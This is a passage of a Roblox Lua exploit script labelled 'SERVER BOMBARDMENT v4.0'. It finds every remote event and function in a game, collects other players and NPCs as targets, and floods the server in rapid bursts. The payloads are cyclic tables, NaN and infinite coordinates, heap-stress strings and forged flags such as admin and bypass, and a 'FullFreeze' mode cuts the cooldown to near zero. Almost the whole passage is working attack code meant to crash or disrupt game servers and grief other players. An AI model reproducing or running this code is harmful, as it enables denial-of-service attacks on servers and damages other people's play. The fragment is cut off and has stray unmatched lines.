    print("[SERVER BOMBARDMENT v4.0] " .. msg)

local function SafeCall(func)
    local success, err = pcall(func)
    if success then
        Cache.Stats.TotalFired = Cache.Stats.TotalFired + 1
    end
    return success
end

local function ScanAllRemotes()
    Log("Executing deep engine scan for remotes, spatial containers, and ecosystem pointers...")
    
    Cache.TouchEvents = {}
    Cache.AllRemoteEvents = {}
    Cache.UnreliableRemotes = {}
    Cache.RemoteFunctions = {}
    Cache.ReplicatedHoldings = {}
    Cache.SpatialContainers = {}
    Cache.PhysicsConstraints = {}
    Cache.ValueTreats = {}
    Cache.HighValueItems = {}
    Cache.EcosystemContainers = {}
    Cache.TaggedInstances = {}
    
    local rootLocations = {
        Services.ReplicatedStorage,
        Services.ReplicatedFirst,
        Services.JointsService,
        Services.Workspace,
        Services.Players,
        Services.StarterGui,
        Services.Lighting,
        Services.SoundService,
        Services.Teams,
        Services.TextChatService,
        Services.Chat
    }
    
    for _, location in ipairs(rootLocations) do
        pcall(function()
            for _, obj in ipairs(location:GetDescendants()) do
                if obj:IsA("RemoteEvent") then
                    table.insert(Cache.AllRemoteEvents, obj)
                    local nameLower = obj.Name:lower()
                    if nameLower:find("touch") or obj.Name == "TouchEvent" or nameLower:find("event") or 
                       nameLower:find("net") or nameLower:find("sync") or nameLower:find("action") or
                       nameLower:find("remote") or nameLower:find("fire") or nameLower:find("data") or
                       nameLower:find("combat") or nameLower:find("hitbox") or nameLower:find("physics") or
                       nameLower:find("shop") or nameLower:find("quest") or nameLower:find("trade") or
                       nameLower:find("purchase") or nameLower:find("craft") or nameLower:find("upgrade") or
                       nameLower:find("inventory") or nameLower:find("world") or nameLower:find("state") then
                        table.insert(Cache.TouchEvents, obj)
                    end
                elseif obj.ClassName == "UnreliableRemoteEvent" then
                    table.insert(Cache.UnreliableRemotes, obj)
                    table.insert(Cache.AllRemoteEvents, obj)
                elseif obj:IsA("RemoteFunction") then
                    table.insert(Cache.RemoteFunctions, obj)
                end
                
                if obj:IsA("Configuration") or obj:IsA("ValueBase") or obj:IsA("ModuleScript") then
                    table.insert(Cache.ValueTreats, obj)
                end
                
                if obj:IsA("Tool") or obj:IsA("Accessory") then
                    table.insert(Cache.HighValueItems, obj)
                end
                
                if (location == Services.ReplicatedStorage or location == Services.Lighting) and (obj:IsA("Folder") or obj:IsA("Configuration") or obj:IsA("Model")) then
                    table.insert(Cache.ReplicatedHoldings, obj)
                end
                
                if location == Services.Workspace and (obj:IsA("Folder") or obj:IsA("Model")) then
                    local fName = obj.Name:lower()
                    if fName:find("hitbox") or fName:find("projectile") or fName:find("debris") or 
                       fName:find("zone") or fName:find("spawn") or fName:find("active") or
                       fName:find("map") or fName:find("world") or fName:find("loot") or
                       fName:find("drop") or fName:find("shop") or fName:find("portal") or
                       fName:find("quest") or fName:find("chest") or fName:find("interactive") or
                       fName:find("region") or fName:find("effect") or fName:find("terrain") or
                       fName:find("building") or fName:find("npc") or fName:find("mob") then
                        table.insert(Cache.SpatialContainers, obj)
                        table.insert(Cache.EcosystemContainers, obj)
                    end
                end

                if obj:IsA("Constraint") then
                    table.insert(Cache.PhysicsConstraints, obj)
                end
            end
        end)
    end
    
    pcall(function()
        local commonTags = {"Interactable", "Shop", "Quest", "Loot", "Portal", "Damage", "Zone", "Spawner", "Chest", "WorldItem", "NetworkSync"}
        for _, tag in ipairs(commonTags) do
            for _, taggedObj in ipairs(Services.CollectionService:GetTagged(tag)) do
                table.insert(Cache.TaggedInstances, taggedObj)
            end
        end
    end)
    
    Cache.Stats.RemotesFound = #Cache.AllRemoteEvents
    Log(string.format("Scan Complete: %d Remotes, %d Ecosystem Folders, %d Tagged Objects", 
        #Cache.AllRemoteEvents, #Cache.EcosystemContainers, #Cache.TaggedInstances))
end

local function GetOtherPlayers()
    Cache.OtherPlayers = {}
    Cache.NPCs = {}
    
    if Config.TargetAllPlayers then
        for _, player in ipairs(Services.Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local char = player.Character
                local hrp = char:FindFirstChild("HumanoidRootPart")
                local humanoid = char:FindFirstChildOfClass("Humanoid")
                
                if hrp and humanoid then
                    local playerData = {
                        Player = player,
                        Character = char,
                        HRP = hrp,
                        Humanoid = humanoid,
                        Head = char:FindFirstChild("Head"),
                        Torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"),
                        Backpack = player:FindFirstChild("Backpack"),
                        Animator = humanoid:FindFirstChildOfClass("Animator") or char:FindFirstChildOfClass("Animator", true),
                        Parts = {},
                        Values = {},
                        Attributes = player:GetAttributes()
                    }
                    
                    for _, part in ipairs(char:GetDescendants()) do
                        if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Attachment") or 
                           part:IsA("Clothing") or part:IsA("Shirt") or part:IsA("Pants") or
                           part:IsA("Sound") or part:IsA("Highlight") or part:IsA("Constraint") or
                           part:IsA("ValueBase") or part:IsA("Tool") or part:IsA("Bone") or
                           part:IsA("BodyColors") then
                            table.insert(playerData.Parts, part)
                        end
                        if part:IsA("ValueBase") then
                            table.insert(playerData.Values, part)
                        end
                    end
                    
                    if playerData.Backpack then
                        for _, tool in ipairs(playerData.Backpack:GetChildren()) do
                            table.insert(playerData.Parts, tool)
                        end
                    end
                    
                    table.insert(Cache.OtherPlayers, playerData)
                end
            end
        end
    end
    
    if Config.TargetNPCs then
        local npcFolders = {
            Services.Workspace:FindFirstChild("Customers"),
            Services.Workspace:FindFirstChild("NPCs"),
            Services.Workspace:FindFirstChild("Enemies"),
            Services.Workspace:FindFirstChild("Characters"),
            Services.Workspace:FindFirstChild("Mobs"),
            Services.Workspace:FindFirstChild("Dummies"),
            Services.Workspace:FindFirstChild("Bosses"),
            Services.Workspace:FindFirstChild("Minions"),
            Services.Workspace:FindFirstChild("Merchants"),
            Services.Workspace:FindFirstChild("Vendors")
        }
        
        for _, folder in ipairs(npcFolders) do
            if folder then
                for _, npc in ipairs(folder:GetDescendants()) do
                    if npc:IsA("Model") then
                        local hrp = npc:FindFirstChild("HumanoidRootPart")
                        local humanoid = npc:FindFirstChildOfClass("Humanoid")
                        
                        if hrp and humanoid then
                            local npcData = {
                                Character = npc,
                                HRP = hrp,
                                Humanoid = humanoid,
                                Parts = {}
                            }
                            for _, part in ipairs(npc:GetDescendants()) do
                                if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Sound") or part:IsA("Constraint") or part:IsA("Tool") or part:IsA("Bone") then
                                    table.insert(npcData.Parts, part)
                                end
                            end
                            table.insert(Cache.NPCs, npcData)
                        end
                    end
                end
            end
        end
    end
    
    Cache.Stats.PlayersAffected = #Cache.OtherPlayers + #Cache.NPCs
    return Cache.Stats.PlayersAffected
end

local function FireRemotesOnOthers()
    if not Config.Active then return 0 end
    if #Cache.OtherPlayers == 0 and #Cache.NPCs == 0 then
        return 0
    end
    
    local fireCount = 0
    local intensity = math.clamp(Config.ChaosIntensity or 5, 0, 5)
    
    local allTargets = {}
    if Config.TargetAllPlayers then
        for _, p in ipairs(Cache.OtherPlayers) do table.insert(allTargets, p) end
    end
    if Config.TargetNPCs then
        for _, n in ipairs(Cache.NPCs) do table.insert(allTargets, n) end
    end
    
    local triggerParts = Cache.TriggerParts or {}
    local depositionPool = Cache.DepositionPool
    local valueTreats = Cache.ValueTreats
    local taggedInstances = Cache.TaggedInstances
    local spatialContainers = Cache.SpatialContainers
    
    local randomHolding = depositionPool[math.random(1, #depositionPool)]
    randomHolding.debounce = os.clock()
    
    local heavyNativeTypes = {
        TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true, 0),
        PhysicalProperties.new(Enum.Material.SmoothPlastic),
        RaycastParams.new(),
        BrickColor.random(),
        Color3.new(math.random(), math.random(), math.random()),
        Region3.new(Vector3.new(-1000,-1000,-1000), Vector3.new(1000,1000,1000))
    }
    local randomUserData = heavyNativeTypes[math.random(1, #heavyNativeTypes)]

    local transientHeapStress = {}
    for i = 1, 600 + (intensity * 200) do
        transientHeapStress[i] = string.rep("APEX_ECOSYSTEM_BACKPRESSURE_MATRIX_", 16)
    end

    -- Cyclic self-referential table for deep server-side deserialization recursion overhead
    local cyclicTable = {}
    cyclicTable.self = cyclicTable
    cyclicTable.parentRef = cyclicTable
    cyclicTable.timestamp = os.clock()
    cyclicTable.sessionToken = math.random(1000000, 9999999)
    cyclicTable.holdingPayload = randomHolding
    cyclicTable.treats = valueTreats[math.random(1, math.max(1, #valueTreats))]
    cyclicTable.nativeData = randomUserData
    cyclicTable.heapSpam = transientHeapStress
    cyclicTable.syntheticWorldData = {
        exploreSector = "Sector_Void_Omega",
        falseItemSpawn = Config.FalseItemInjection,
        worldStateHash = Services.HttpService:GenerateGUID(false),
        coordinatesVector = Vector3.new(math.huge, 0/0, math.huge),
        matrixTransform = CFrame.new(0/0, 0/0, 0/0, math.huge, math.huge, math.huge, math.huge, math.huge, math.huge)
    }
    cyclicTable.metadata = {
        verified = false,
        bypass = true,
        admin = true,
        serverSide = true,
        firecd = true,
        stateDeploy = true,
        recoveryPrevention = true,
        apexEcosystemSync = true,
        spamBuffer = string.rep("QUANTUM_APEX_STREAM_V4_", 48)
    }
    
    local extremeVector = Vector3.new(0/0, math.huge, 0/0)
    local extremeCFrame = CFrame.new(math.huge, math.huge, math.huge)
    
    -- Multi-threaded coroutine worker dispatch
    for _, touchEvent in ipairs(Cache.TouchEvents) do
        for _, target in ipairs(allTargets) do
            if not Config.Active then break end
            Cache.Stats.CoroutinesActive = Cache.Stats.CoroutinesActive + 1
            task.spawn(function()
                SafeCall(function()
                    if #triggerParts > 0 then
                        local part = triggerParts[math.random(1, #triggerParts)]
                        touchEvent:FireServer(target.HRP, part, randomHolding, randomUserData, cyclicTable)
                        fireCount = fireCount + 1
                    end
                    if #taggedInstances > 0 then
                        local taggedObj = taggedInstances[math.random(1, #taggedInstances)]
                        touchEvent:FireServer(target.Character, taggedObj, extremeVector, "apexTagSync", cyclicTable)
                        fireCount = fireCount + 1
                    end
                    if #spatialContainers > 0 then
                        local container = spatialContainers[math.random(1, #spatialContainers)]
                        touchEvent:FireServer(container, target.HRP, "worldExploreSync", randomUserData)
                        fireCount = fireCount + 1
                    end
                end)
                Cache.Stats.CoroutinesActive = math.max(0, Cache.Stats.CoroutinesActive - 1)
            end)
        end
    end
    
    for _, remote in ipairs(Cache.AllRemoteEvents) do
        for _, target in ipairs(allTargets) do
            if not Config.Active then break end
            Cache.Stats.CoroutinesActive = Cache.Stats.CoroutinesActive + 1
            task.spawn(function()
                SafeCall(function() remote:FireServer(target.HRP, "buy", "item", randomUserData, cyclicTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Character, "sell", "loot", randomUserData, transientHeapStress) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Humanoid, "craft", "recipe", 999999, extremeVector) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Player, "upgrade", "skill", extremeVector, cyclicTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.HRP, extremeCFrame, "claim", "reward", randomUserData) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Character, "quest", "complete", "redeem", cyclicTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(cyclicTable, "trade", "offer", Services.Workspace, randomUserData) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Backpack, "interact", "use", {serverSide = true, falseItem = "CosmicVoidItem"}) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Player, target.Character, target.Humanoid, "consume", true, false, cyclicTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(Services.Lighting, Services.Teams, extremeVector, cyclicTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.HRP, "firecd", "cooldown", "debounce", transientHeapStress, extremeCFrame) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Character, "stateChange", "modify", "physicsUpdate", extremeCFrame, cyclicTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Player, target.UserId, "treatConsume", valueTreats[1], cyclicTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(Services.ReplicatedStorage, Services.SoundService, transientHeapStress, extremeVector) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.HRP, target.Humanoid, target.Character, cyclicTable, transientHeapStress, extremeCFrame, randomUserData, {serverSide = true, FEOnly = true, OnlyServer = true, forceExecute = true, recoveryPrevention = true, apexActive = true, worldExplore = true}) fireCount = fireCount + 1 end)
                Cache.Stats.CoroutinesActive = math.max(0, Cache.Stats.CoroutinesActive - 1)
            end)
        end
    end
    
    for _, remoteFunc in ipairs(Cache.RemoteFunctions) do
        for _, target in ipairs(allTargets) do
            if not Config.Active then break end
            Cache.Stats.CoroutinesActive = Cache.Stats.CoroutinesActive + 1
            task.spawn(function()
                SafeCall(function()
                    remoteFunc:InvokeServer(target.HRP, Services.Workspace, randomHolding, randomUserData, cyclicTable, extremeVector, "firecd", "deploy", transientHeapStress)
                    fireCount = fireCount + 1
                end)
                Cache.Stats.CoroutinesActive = math.max(0, Cache.Stats.CoroutinesActive - 1)
            end)
        end
    end
    
    return fireCount
end

function GUI.UpdateStats()
    if not GUI.RemoteStat then return end
    
    GUI.RemoteStat.Text = string.format("📡 Remotes: %d (%d Touch)", #Cache.AllRemoteEvents, #Cache.TouchEvents)
    GUI.TriggerStat.Text = string.format("🎯 Triggers: %d | Containers: %d", #Cache.TriggerParts, #Cache.SpatialContainers)
    GUI.TargetStat.Text = string.format("👥 Players: %d (+ %d NPCs)", #Cache.OtherPlayers, #Cache.NPCs)
    
    local formatted = Cache.Stats.TotalFired >= 1000000 and string.format("%.1fM", Cache.Stats.TotalFired / 1000000) or
                     Cache.Stats.TotalFired >= 1000 and string.format("%.1fK", Cache.Stats.TotalFired / 1000) or
                     tostring(Cache.Stats.TotalFired)
    
    GUI.FiredStat.Text = "💥 Fired: " .. formatted
end

    end
end

-- Rate-Limited Multi-Threaded Burst Scheduler (Fires ONLY when Active)
task.spawn(function()
    while true do
        Services.RunService.Heartbeat:Wait()
        
        if Config.Active then
            GetOtherPlayers()
            
            local burstCount = math.random(20, 35)
            for i = 1, burstCount do
                if not Config.Active then break end
                FireRemotesOnOthers()
            end
            
            local cooldown = math.random(30, 50) / 100
            if Config.FullFreezeActive then
                cooldown = 0.01
            end
            task.wait(cooldown)
        end
    end
end)
